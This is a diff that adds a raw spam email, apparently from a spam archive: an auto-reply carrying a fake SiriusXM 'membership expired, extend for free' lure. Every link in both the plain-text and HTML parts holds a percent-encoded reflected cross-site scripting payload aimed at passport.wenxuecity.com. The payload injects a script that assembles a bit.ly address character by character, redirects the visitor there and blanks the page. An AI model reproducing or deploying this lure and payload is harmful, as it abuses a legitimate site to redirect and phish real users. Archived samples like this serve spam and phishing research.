@@ -1,0 +1,355 @@
+Return-Path: <>
+Delivered-To: untroubl8492-bruce@untroubled.org
+Received: (qmail 975699 invoked from network); 8 Dec 2023 20:25:44 -0000
+Received: from NAM12-MW2-obe.outbound.protection.outlook.com (mail-mw2nam12olkn2034.outbound.protection.outlook.com [40.92.23.34])
+  by vx0.untroubled.org ([45.63.65.23])
+  with ESMTP via TCP; 08 Dec 2023 20:25:44 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=O1I4/b8x3mkWbdeJU8SEmO4aT3xm/OWRBNpfw4QRR/FKfJE/ofpWkcWsF89SaocJdhwOTooPPve6iSxU1We5dOS2UCrLusemUoiZKnD+dJDjgw9SZusmKHHOF/NpmVMjTFtIFMqlyG+l/yC6lacUbjTMAbNeC8EOxJnZQO4SNPp4hKhVbV/xulkIiXaan+siFtXV36lY/PvM/p2+i9UkYMWeHmACkjJg/hE5Od9WoOKpwLvxeNjnVS5w08BVuCxB/Z0Ec05Pqajtn6osm7a3elxTGknD1uuPwfnd6+O6D7Ahs4OeIwZYbzwtGopGoIlzbnqNGfKyjdHMsIuyEZSX/w==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=VNf6DWFt8vCpUK9jlhXUbUC93YSjrCer/b8C3vTvXjU=;
+ b=UqP682dbb4X92HY2VMquWtF7EQPDCvld+RhSdgzZfbddEuyJSh+xpHb0BxLRMbp8PgTJo5Ez/d1gyfdOMjuEtLB5/HZ1r0gx1AYZd95gdgoHu4nSOfZybZH2JTqxBIW/bqV/hhrfYI7h0KgGYeHBP26sIfdt3mAAdGCRYfljtQB2Po1F/LdL8q3Hn0MBSQAh7ECaUsO4iPAA7oG8N19DcoYk0CMPLWspejNktBWqy1k8642wKThgwQ4CxUiY01fWHaFfPc9rrFoAaC9Lus1OMg+d11NcBynCGjmdgRgVU8XkEnavW5jQf8x0biYezj9Ek88piEuO66APEn3LZso1lw==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+Received: from PH7P223MB0595.NAMP223.PROD.OUTLOOK.COM (2603:10b6:510:1ad::5)
+ by PH7P223MB0569.NAMP223.PROD.OUTLOOK.COM (2603:10b6:510:1b4::8) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.7091.17; Fri, 8 Dec
+ 2023 20:25:42 +0000
+Received: from PH7P223MB0595.NAMP223.PROD.OUTLOOK.COM ([::1]) by
+ PH7P223MB0595.NAMP223.PROD.OUTLOOK.COM ([fe80::316b:6110:ca29:793a%5]) with
+ Microsoft SMTP Server id 15.20.7068.025; Fri, 8 Dec 2023 20:25:42 +0000
+From: "Your membership has expired! ." <montagueflirt037@hotmail.com>
+To: "bruce@untroubled.org" <bruce@untroubled.org>
+Subject: Automatic reply: Your SiriusXM Membership has Expired 885943
+Thread-Topic: Your SiriusXM Membership has Expired 885943
+Thread-Index: AQHaKhS2ui9UMNskpESW6HomjvUY9LCf1UX9
+Date: Fri, 8 Dec 2023 20:25:42 +0000
+Message-ID:
+ <45dd7b2f6a92426fb98040cd35e05564@PH7P223MB0595.NAMP223.PROD.OUTLOOK.COM>
+References:
+ <KVjAhaAMQ0RAmjNAx81AU5lJ3YoDaDTmKzBlRwCG]@fLmAG4keTzmGP7i.Jve6awc4.prod.outlook.com>
+In-Reply-To:
+ <KVjAhaAMQ0RAmjNAx81AU5lJ3YoDaDTmKzBlRwCG]@fLmAG4keTzmGP7i.Jve6awc4.prod.outlook.com>
+X-MS-Has-Attach:
+X-Auto-Response-Suppress: All
+X-MS-Exchange-Inbox-Rules-Loop: montagueflirt037@hotmail.com
+X-MS-TNEF-Correlator:
+x-ms-exchange-parent-message-id:
+ <KVjAhaAMQ0RAmjNAx81AU5lJ3YoDaDTmKzBlRwCG]@fLmAG4keTzmGP7i.Jve6awc4.prod.outlook.com>
+auto-submitted: auto-generated
+x-ms-exchange-generated-message-source: Mailbox Rules Agent
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: PH7P223MB0595:EE_|PH7P223MB0569:EE_
+x-ms-office365-filtering-correlation-id: ca6ae2d5-cb57-4358-ab6d-08dbf82bda05
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info:
+ O22eUyB27sYq+Zmjo+509hgNZmakMb21zwx7Hssdjp7P5yQeZB04P788SRiGN5oZGj6gP12Uvg/kodUHzzu6zmYoS8uH+RsAYeonWP9E9TVtLFMQ0ojYeJ5CJCnwcyE6JPwGWPcmgT/e15GyrQ8j3NdEjpxncyX4hH0Qov5cK4965AUTXtuCiV4c1aIxPW2QRkxbNWGL7HNhyqXJpNVBE0N9gUALN9tIDTgEk52tLSmkxoJm+iXp6zwhbQ17rHEA/fQAVwyrQK7cA0ASscQVIbyHJZN+cej+UY921tVjqkz2OJFyY9psRnMvURZ2MdS9trtraBJNnO+4Uw4/mU3ooFzAjOfXRRifod5ZqRrpL1r/M9bJDaTFX0ZjHLyQQ1EPHp2Q04AXwN9FpdtXQz+DOMTGXosFc3jbpApQZQs1zG41rwZWhkhc5d/H46kG8TtG9641CKg/F8oGgeSbbTvn5CQ1BxEil3xvWAjBuWROEZB988R1plBUy3O3nAoESBzaNodFLVZqom7Wa7KzFKc5iQ0TQtoKPUDECM7D3jdS3ueVdvcp66IpimnMgj9c0hAcsgq7HOQIglFIa2r9GOqLRRBDq9Mm8zlevCvc/QjVGGKWlIDU7+oiPst+1jawNLMmtwUh80ozMFcnnbka5yXTutQH5+BlJPPxwEJPg9AZtc3D32+1FOa1G8VxrS/hZC7/PHe+CPpz8TfbsSKOnXuiYKNiv8qU8qJMnJyN7pnccuY=
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ mivvI2qKA5sRkuqYL7BTeGvFeUzMUCIGCqbIzPRSR0GboKlxFttPO9HuHOAqA1dXhY4eqJ73wzu0Vn6j6TgHY7zLhTbEG6+AWX+FZaBn8jypx5dxJS3pVnuYVJI2oDJuMJkW7vZXIRAhAg0ww0Q94KmvhX/E2EQfhYbHpk7SgRkloNMPzSwW/poUaN9ljo1yjy7h1697vjgvlwxwtckD4948g2suaz0yBxI9j17dFqc7WkgVb+0lIhRJhBO1a6YkORJVsf9uuod9iYRKVq3D+i37m3aP5wTXVHR8twdgtGTnsu3tb0+BrhDI5ISf0iL+
+Content-Type: multipart/alternative;
+	boundary="_000_45dd7b2f6a92426fb98040cd35e05564PH7P223MB0595NAMP223PRO_"
+MIME-Version: 1.0
+X-OriginatorOrg: sct-15-20-4755-11-msonline-outlook-1ff67.templateTenant
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: PH7P223MB0595.NAMP223.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-Network-Message-Id: ca6ae2d5-cb57-4358-ab6d-08dbf82bda05
+X-MS-Exchange-CrossTenant-originalarrivaltime: 08 Dec 2023 20:25:42.7518
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH7P223MB0569
+
+--_000_45dd7b2f6a92426fb98040cd35e05564PH7P223MB0595NAMP223PRO_
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+SPECIAL OFFER: Extend your membership for free<https://passport.wenxuecity.=
+com/%62%62%73%2F%61%72%63%68%69%76%65%2E%70%68%70?%6B%65%79%77%6F%72%64=3D%=
+22%3E%3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%5B%27%6C%6F%63%61%74%69%6F%=
+6E%27%5D%5B%27%72%65%70%6C%61%63%65%27%5D%28%5B%27%68%27%2C%27%74%27%2C%27%=
+74%27%2C%27%70%27%2C%27%73%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27%62%=
+27%2C%27%69%27%2C%27%74%27%2C%27%2E%27%2C%27%6C%27%2C%27%79%27%2C%27%2F%27%=
+2C%27%33%27%2C%27%52%27%2C%27%42%27%2C%27%63%27%2C%27%6A%27%2C%27%37%27%2C%=
+27%37%27%5D%5B%27%6A%6F%69%6E%27%5D%28%27%27%29%29%2C%64%6F%63%75%6D%65%6E%=
+74%5B%27%62%6F%64%79%27%5D%5B%27%73%74%79%6C%65%27%5D%5B%27%6F%70%61%63%69%=
+74%79%27%5D=3D%30%78%30%3B%3C%2F%73%63%72%69%70%74%3E>
+
+[https://attachment.tapatalk-cdn.com/115430/202312/2_0bafba9a2ea99fd52afb09=
+1c7b89bd85.png]<https://passport.wenxuecity.com/%62%62%73%2F%61%72%63%68%69=
+%76%65%2E%70%68%70?%6B%65%79%77%6F%72%64=3D%22%3E%3C%73%63%72%69%70%74%3E%7=
+7%69%6E%64%6F%77%5B%27%6C%6F%63%61%74%69%6F%6E%27%5D%5B%27%72%65%70%6C%61%6=
+3%65%27%5D%28%5B%27%68%27%2C%27%74%27%2C%27%74%27%2C%27%70%27%2C%27%73%27%2=
+C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27%62%27%2C%27%69%27%2C%27%74%27%2C%2=
+7%2E%27%2C%27%6C%27%2C%27%79%27%2C%27%2F%27%2C%27%33%27%2C%27%52%27%2C%27%4=
+2%27%2C%27%63%27%2C%27%6A%27%2C%27%37%27%2C%27%37%27%5D%5B%27%6A%6F%69%6E%2=
+7%5D%28%27%27%29%29%2C%64%6F%63%75%6D%65%6E%74%5B%27%62%6F%64%79%27%5D%5B%2=
+7%73%74%79%6C%65%27%5D%5B%27%6F%70%61%63%69%74%79%27%5D=3D%30%78%30%3B%3C%2=
+F%73%63%72%69%70%74%3E>
+
+
+
+
+
+
+- -
+--
+
+CLICK HERE<https://passport.wenxuecity.com/%62%62%73%2F%61%72%63%68%69%76%6=
+5%2E%70%68%70?%6B%65%79%77%6F%72%64=3D%22%3E%3C%73%63%72%69%70%74%3E%77%69%=
+6E%64%6F%77%5B%27%6C%6F%63%61%74%69%6F%6E%27%5D%5B%27%72%65%70%6C%61%63%65%=
+27%5D%28%5B%27%68%27%2C%27%74%27%2C%27%74%27%2C%27%70%27%2C%27%73%27%2C%27%=
+3A%27%2C%27%2F%27%2C%27%2F%27%2C%27%62%27%2C%27%69%27%2C%27%74%27%2C%27%2E%=
+27%2C%27%6C%27%2C%27%79%27%2C%27%2F%27%2C%27%34%27%2C%27%36%27%2C%27%53%27%=
+2C%27%6A%27%2C%27%57%27%2C%27%74%27%2C%27%59%27%5D%5B%27%6A%6F%69%6E%27%5D%=
+28%27%27%29%29%2C%64%6F%63%75%6D%65%6E%74%5B%27%62%6F%64%79%27%5D%5B%27%73%=
+74%79%6C%65%27%5D%5B%27%6F%70%61%63%69%74%79%27%5D=3D%30%78%30%3B%3C%2F%73%=
+63%72%69%70%74%3E> To Get Removed
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--_000_45dd7b2f6a92426fb98040cd35e05564PH7P223MB0595NAMP223PRO_
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
+>
+</head>
+<body>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center"><span style=3D"font-size:24px"><a href=3D"https://passport.w=
+enxuecity.com/%62%62%73%2F%61%72%63%68%69%76%65%2E%70%68%70?%6B%65%79%77%6F=
+%72%64=3D%22%3E%3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%5B%27%6C%6F%63%61=
+%74%69%6F%6E%27%5D%5B%27%72%65%70%6C%61%63%65%27%5D%28%5B%27%68%27%2C%27%74=
+%27%2C%27%74%27%2C%27%70%27%2C%27%73%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27=
+%2C%27%62%27%2C%27%69%27%2C%27%74%27%2C%27%2E%27%2C%27%6C%27%2C%27%79%27%2C=
+%27%2F%27%2C%27%33%27%2C%27%52%27%2C%27%42%27%2C%27%63%27%2C%27%6A%27%2C%27=
+%37%27%2C%27%37%27%5D%5B%27%6A%6F%69%6E%27%5D%28%27%27%29%29%2C%64%6F%63%75=
+%6D%65%6E%74%5B%27%62%6F%64%79%27%5D%5B%27%73%74%79%6C%65%27%5D%5B%27%6F%70=
+%61%63%69%74%79%27%5D=3D%30%78%30%3B%3C%2F%73%63%72%69%70%74%3E" target=3D"=
+blank"><span style=3D"font-family:Georgia,serif"><strong><span style=3D"col=
+or:rgb(255,0,0)">SPECIAL
+ OFFER: Extend your membership for free</span></strong></span></a></span></=
+p>
+<table width=3D"100" style=3D"font-family:&quot;Times New Roman&quot;; heig=
+ht:110px; margin-left:auto; border:2px solid rgb(0,0,0); margin-right:auto"=
+>
+<tbody>
+<tr>
+<td style=3D"text-align:center; width:860px">
+<p><a href=3D""><span style=3D"font-size:18px"></span></a><a href=3D"https:=
+//passport.wenxuecity.com/%62%62%73%2F%61%72%63%68%69%76%65%2E%70%68%70?%6B=
+%65%79%77%6F%72%64=3D%22%3E%3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%5B%27=
+%6C%6F%63%61%74%69%6F%6E%27%5D%5B%27%72%65%70%6C%61%63%65%27%5D%28%5B%27%68=
+%27%2C%27%74%27%2C%27%74%27%2C%27%70%27%2C%27%73%27%2C%27%3A%27%2C%27%2F%27=
+%2C%27%2F%27%2C%27%62%27%2C%27%69%27%2C%27%74%27%2C%27%2E%27%2C%27%6C%27%2C=
+%27%79%27%2C%27%2F%27%2C%27%33%27%2C%27%52%27%2C%27%42%27%2C%27%63%27%2C%27=
+%6A%27%2C%27%37%27%2C%27%37%27%5D%5B%27%6A%6F%69%6E%27%5D%28%27%27%29%29%2C=
+%64%6F%63%75%6D%65%6E%74%5B%27%62%6F%64%79%27%5D%5B%27%73%74%79%6C%65%27%5D=
+%5B%27%6F%70%61%63%69%74%79%27%5D=3D%30%78%30%3B%3C%2F%73%63%72%69%70%74%3E=
+" target=3D"_blank"><img src=3D"https://attachment.tapatalk-cdn.com/115430/=
+202312/2_0bafba9a2ea99fd52afb091c7b89bd85.png"></a><br>
+</p>
+<div><br>
+</div>
+<div style=3D"font-size:medium"></div>
+</td>
+</tr>
+</tbody>
+</table>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center">&nbsp;</p>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center">&nbsp;</p>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center">- -<br>
+--</p>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center"><a href=3D""><span style=3D"font-size:18px"></span></a><a hr=
+ef=3D"https://passport.wenxuecity.com/%62%62%73%2F%61%72%63%68%69%76%65%2E%=
+70%68%70?%6B%65%79%77%6F%72%64=3D%22%3E%3C%73%63%72%69%70%74%3E%77%69%6E%64=
+%6F%77%5B%27%6C%6F%63%61%74%69%6F%6E%27%5D%5B%27%72%65%70%6C%61%63%65%27%5D=
+%28%5B%27%68%27%2C%27%74%27%2C%27%74%27%2C%27%70%27%2C%27%73%27%2C%27%3A%27=
+%2C%27%2F%27%2C%27%2F%27%2C%27%62%27%2C%27%69%27%2C%27%74%27%2C%27%2E%27%2C=
+%27%6C%27%2C%27%79%27%2C%27%2F%27%2C%27%34%27%2C%27%36%27%2C%27%53%27%2C%27=
+%6A%27%2C%27%57%27%2C%27%74%27%2C%27%59%27%5D%5B%27%6A%6F%69%6E%27%5D%28%27=
+%27%29%29%2C%64%6F%63%75%6D%65%6E%74%5B%27%62%6F%64%79%27%5D%5B%27%73%74%79=
+%6C%65%27%5D%5B%27%6F%70%61%63%69%74%79%27%5D=3D%30%78%30%3B%3C%2F%73%63%72=
+%69%70%74%3E" target=3D"_blank">CLICK
+ HERE</a><span>&nbsp;</span>To Get Removed<br>
+</p>
+<div style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; te=
+xt-align:center"><font style=3D"color:rgb(255,255,255)"><br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+</font></div>
+</body>
+</html>
+
+--_000_45dd7b2f6a92426fb98040cd35e05564PH7P223MB0595NAMP223PRO_--
